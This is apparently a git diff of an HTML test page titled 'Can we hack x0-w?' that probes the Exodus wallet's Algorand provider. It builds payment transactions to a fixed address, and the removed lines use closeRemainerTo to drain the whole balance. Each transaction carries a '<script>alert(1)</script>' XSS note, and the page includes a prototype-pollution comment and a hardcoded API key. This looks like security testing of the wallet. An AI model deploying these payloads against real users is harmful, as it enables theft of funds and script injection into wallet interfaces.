@@ -5,7 +5,7 @@
         <!--<script src="chrome-extension://llekelocgcbelmdpkdjigdgnckkobioc/algorand-provider.js">ay no</script>-->
         <script src="https://cdn.jsdelivr.net/npm/algosdk@v1.24.1/dist/browser/algosdk.min.js" integrity="sha384-cXCnQHmkjqS84S5jqAp6YXjU1ynCEJaHROHklSY7eh+cCXQ3aGX0oSgJSfQgDF5y" crossorigin="anonymous"></script>
     </head>
-    <body style="background: rgb(107,231,147); background: radial-gradient(circle, rgba(110,190,100,1) 0%, rgba(150,150,250,1) 35%, rgba(50,250,100,1) 100%);">
+    <body style="background: rgb(107,231,147); background: radial-gradient(circle, rgba(210,190,100,1) 0%, rgba(150,150,250,1) 35%, rgba(50,250,100,1) 100%);">
         <script type="module">
             // PROTOTYPE POLLUTION
             //window.exodus = {}
@@ -44,24 +44,39 @@
                     'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq',
                 };
                 const algodClient = new algosdk.Algodv2(token, baseServer, port);
-                const suggestedParams = await algodClient.getTransactionParams().do();
-                console.log("[*] suggestedParams: ");
-                console.log(suggestedParams);
+                
+                //Check your balance
+                let accountInfo = await algodClient.accountInformation('RN6KHCDQEH4VONJWXQ4QULCAX5R2NM2DFDCVYTU3ZTKGFUQGFS5NTPTHJY').do();
+                console.log("Account balance: %d microAlgos", accountInfo.amount);
+                
+                // Construct the transaction
+                let params = await algodClient.getTransactionParams().do();
+                // comment out the next two lines to use suggested fee
+                params.fee = algosdk.ALGORAND_MIN_TX_FEE;
+                params.flatFee = true;
+
+                const receiver = "KUARVTRTHI5CNBLLWJ2MXFCJECD34HXZJHWNC2NWEOXUSTRKKMRUYKFBOM";
                 const enc = new TextEncoder();
                 const note = enc.encode('<script>alert(1)<\/script>');
-                const transaction = algosdk.makePaymentTxnWithSuggestedParamsFromObject({
-                    suggestedParams,
-                    from: window.exodus.algorand.address,
-                    to: 'KUARVTRTHI5CNBLLWJ2MXFCJECD34HXZJHWNC2NWEOXUSTRKKMRUYKFBOM',
-                    note: note,
-                    closeRemainerTo: 'KUARVTRTHI5CNBLLWJ2MXFCJECD34HXZJHWNC2NWEOXUSTRKKMRUYKFBOM',
-                    amount: 500000, // Equals 0.5 ALGO
+                let amount = 1000000; // equals 1 ALGO
+                let sender = "RN6KHCDQEH4VONJWXQ4QULCAX5R2NM2DFDCVYTU3ZTKGFUQGFS5NTPTHJY";
+
+                let txn = algosdk.makePaymentTxnWithSuggestedParamsFromObject({
+                    from: sender, 
+                    to: receiver, 
+                    amount: amount, 
+                    note: note, 
+                    suggestedParams: params
                 });
 
+                console.log("[*] txn: ");
+                console.log(txn);
+
                 const signedTransactions = await window.exodus.algorand.signAndSendTransaction([
-                    transaction.toByte(),
+                    txn.toByte(),
                 ]);
-                console.log('Tran: ');
+
+                console.log('[*] Transaction: ');
                 console.log(signedTransactions);
             }
 
@@ -147,7 +162,7 @@
 
         <div style="margin-top:30%;padding: 6px;width:50%;background-color:#000;color:#0E0;border:7px groove #3A6">
         <h1 style="color:#E00;text-shadow: 2px 2px 4px #0f0;">
-        35
+        36
         </h1>
         <h2>Can we hack x0-w?</h2>
         <input type="button" value="algo_connect" onclick="algo_connect()" />
